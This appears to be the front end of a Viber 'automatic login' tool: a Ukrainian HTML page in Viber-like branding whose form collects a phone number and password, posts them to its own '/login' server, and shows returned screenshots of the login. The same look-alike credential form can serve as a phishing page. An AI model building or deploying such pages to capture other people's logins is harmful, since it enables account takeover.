<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вхід у Viber</title>
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --purple: #665CAC;
            --purple-dark: #4e4582;
            --purple-light: #8B7BBF;
            --purple-glow: rgba(102, 92, 172, 0.35);
            --white: #ffffff;
            --gray: #f4f3fa;
            --text: #2d2b3d;
            --muted: #9991c0;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Nunito', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #1a1730;
            overflow: hidden;
        }

        /* Animated background blobs */
        .bg {
            position: fixed;
            inset: 0;
            z-index: 0;
            pointer-events: none;
        }
        .blob {
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.4;
            animation: float 8s ease-in-out infinite;
        }
        .blob-1 {
            width: 500px; height: 500px;
            background: #665CAC;
            top: -150px; left: -100px;
            animation-delay: 0s;
        }
        .blob-2 {
            width: 400px; height: 400px;
            background: #a078e0;
            bottom: -100px; right: -80px;
            animation-delay: 3s;
        }
        .blob-3 {
            width: 300px; height: 300px;
            background: #4e3fa0;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            animation-delay: 1.5s;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-30px) scale(1.05); }
        }
        .blob-3 {
            animation: float2 8s ease-in-out infinite;
            animation-delay: 1.5s;
        }
        @keyframes float2 {
            0%, 100% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -55%) scale(1.08); }
        }

        /* Card */
        .card {
            position: relative;
            z-index: 1;
            background: rgba(255,255,255,0.07);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid rgba(255,255,255,0.13);
            border-radius: 28px;
            padding: 48px 44px 44px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 32px 80px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.05);
            animation: cardIn 0.7s cubic-bezier(.22,1,.36,1) both;
        }
        @keyframes cardIn {
            from { opacity: 0; transform: translateY(40px) scale(0.97); }
            to   { opacity: 1; transform: translateY(0) scale(1); }
        }

        /* Logo */
        .logo-wrap {
            display: flex;
            justify-content: center;
            margin-bottom: 28px;
        }
        .logo-circle {
            width: 80px; height: 80px;
            background: linear-gradient(135deg, #7c6fc7, #9f78e0);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 8px 32px rgba(102,92,172,0.5);
            animation: pulse 3s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { box-shadow: 0 8px 32px rgba(102,92,172,0.5); }
            50% { box-shadow: 0 8px 48px rgba(102,92,172,0.8); }
        }
        .logo-circle svg { width: 44px; height: 44px; }

        /* Heading */
        .heading {
            text-align: center;
            margin-bottom: 32px;
        }
        .heading h1 {
            font-size: 26px;
            font-weight: 800;
            color: #fff;
            letter-spacing: -0.5px;
            margin-bottom: 6px;
        }
        .heading p {
            font-size: 14px;
            color: rgba(255,255,255,0.5);
            font-weight: 600;
        }

        /* Inputs */
        .field {
            margin-bottom: 16px;
        }
        .field label {
            display: block;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: rgba(255,255,255,0.5);
            margin-bottom: 8px;
        }
        .input-wrap {
            position: relative;
        }
        .input-wrap .icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
            pointer-events: none;
        }
        .field input {
            width: 100%;
            padding: 15px 16px 15px 48px;
            background: rgba(255,255,255,0.08);
            border: 1.5px solid rgba(255,255,255,0.12);
            border-radius: 14px;
            font-size: 16px;
            font-family: 'Nunito', sans-serif;
            font-weight: 600;
            color: #fff;
            outline: none;
            transition: border-color 0.25s, background 0.25s, box-shadow 0.25s;
        }
        .field input::placeholder { color: rgba(255,255,255,0.3); }
        .field input:focus {
            border-color: #8B7BBF;
            background: rgba(255,255,255,0.12);
            box-shadow: 0 0 0 4px rgba(102,92,172,0.2);
        }

        /* Button */
        .btn {
            width: 100%;
            padding: 16px;
            margin-top: 8px;
            background: linear-gradient(135deg, #7c6fc7 0%, #9f78e0 100%);
            border: none;
            border-radius: 14px;
            font-size: 17px;
            font-family: 'Nunito', sans-serif;
            font-weight: 800;
            color: #fff;
            cursor: pointer;
            letter-spacing: 0.3px;
            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
            box-shadow: 0 8px 24px rgba(102,92,172,0.4);
            position: relative;
            overflow: hidden;
        }
        .btn::after {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(255,255,255,0.15), transparent);
            opacity: 0;
            transition: opacity 0.2s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(102,92,172,0.55); }
        .btn:hover::after { opacity: 1; }
        .btn:active { transform: translateY(0); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }

        /* Status */
        #status {
            margin-top: 18px;
            padding: 14px 16px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 700;
            text-align: center;
            display: none;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
        #status.loading {
            display: block;
            background: rgba(255,255,255,0.08);
            color: rgba(255,255,255,0.7);
            border: 1px solid rgba(255,255,255,0.1);
        }
        #status.success {
            display: block;
            background: rgba(72,199,142,0.15);
            color: #48c78e;
            border: 1px solid rgba(72,199,142,0.3);
        }
        #status.error {
            display: block;
            background: rgba(255,100,100,0.12);
            color: #ff8080;
            border: 1px solid rgba(255,100,100,0.25);
        }

        /* Screenshot */
        #screenshot {
            display: none;
            margin-top: 16px;
            width: 100%;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        /* Spinner */
        .spinner {
            display: inline-block;
            width: 16px; height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="bg">
        <div class="blob blob-1"></div>
        <div class="blob blob-2"></div>
        <div class="blob blob-3"></div>
    </div>

    <div class="card">
        <div class="logo-wrap">
            <div class="logo-circle">
                <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M33.5 28.5c-1.5-1-3-1.5-4.5-2-.5-.2-1 0-1.3.4l-1 1.5c-.3.4-.8.5-1.2.3-2-1-3.5-2.5-4.5-4.5-.2-.4-.1-.9.3-1.2l1.5-1c.4-.3.6-.8.4-1.3-.5-1.5-1-3-2-4.5-.3-.4-.8-.6-1.3-.4-1.5.5-3 1.5-3.5 3-.5 2 0 4.5 2 7.5 2 3 5 6 8 8 3 2 5.5 2.5 7.5 2 1.5-.5 2.5-2 3-3.5.2-.5 0-1-.4-1.3z" fill="white"/>
                    <path d="M24 12c5.5 0 10 4 10.5 9 0 .5.5 1 1 1s1-.5 1-1C36 14.5 30.5 10 24 10c-.5 0-1 .5-1 1s.5 1 1 1z" fill="white" opacity="0.8"/>
                    <path d="M24 16c3.5 0 6.5 2.5 7 6 0 .5.5 1 1 1s1-.5 1-1c-.5-4.5-4.5-8-9-8-.5 0-1 .5-1 1s.5 1 1 1z" fill="white" opacity="0.8"/>
                    <path d="M24 20c1.5 0 3 1 3.5 2.5.2.5.7.8 1.2.6.5-.2.8-.7.6-1.2C28.5 19.5 26.5 18 24 18c-.5 0-1 .5-1 1s.5 1 1 1z" fill="white" opacity="0.8"/>
                </svg>
            </div>
        </div>

        <div class="heading">
            <h1>Вхід у Viber</h1>
            <p>Введіть дані для автоматичного входу</p>
        </div>

        <form id="viberForm">
            <div class="field">
                <label>Номер телефону</label>
                <div class="input-wrap">
                    <span class="icon">📱</span>
                    <input type="tel" id="phone" placeholder="+380XXXXXXXXX" required />
                </div>
            </div>

            <div class="field">
                <label>Пароль</label>
                <div class="input-wrap">
                    <span class="icon">🔒</span>
                    <input type="password" id="password" placeholder="Введіть пароль" required />
                </div>
            </div>

            <button type="submit" class="btn" id="submitBtn">
                Увійти у Viber
            </button>
        </form>

        <div id="status"></div>
        <img id="screenshot" alt="Результат" />
    </div>

    <script>
        document.getElementById('phone').addEventListener('input', function() {
            this.value = this.value.replace(/[^\d+\s\-()]/g, '');
        });

        document.getElementById('viberForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            let phone = document.getElementById('phone').value.replace(/[^\d+]/g, '');
            if (phone.startsWith('+')) phone = phone.substring(1);

            const password = document.getElementById('password').value;

            if (phone.length < 10) {
                setStatus('error', '❌ Введіть коректний номер телефону');
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span>Виконується вхід...';
            setStatus('loading', '⏳ Підключаємось до Viber...');

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, password })
                });

                const data = await response.json();

                if (data.success) {
                    setStatus('success', '✅ Успішно! Дивіться результат нижче');
                    const img = document.getElementById('screenshot');
                    img.src = 'data:image/png;base64,' + data.screenshot;
                    img.style.display = 'block';

                    // Показуємо скріншот ДО кліку
                    if (data.screenshotBefore) {
                        const img2 = document.createElement('img');
                        img2.src = 'data:image/png;base64,' + data.screenshotBefore;
                        img2.style.cssText = 'width:100%;border-radius:12px;margin-top:8px;border:1px solid rgba(255,255,255,0.1)';
                        document.querySelector('.card').appendChild(img2);
                    }
                }
            } catch (err) {
                setStatus('error', '❌ Сервер недоступний');
            }

            btn.disabled = false;
            btn.innerHTML = 'Увійти у Viber';
        });

        function setStatus(type, text) {
            const el = document.getElementById('status');
            el.className = type;
            el.innerHTML = text;
            el.style.display = 'block';
        }
    </script>
</body>
</html>
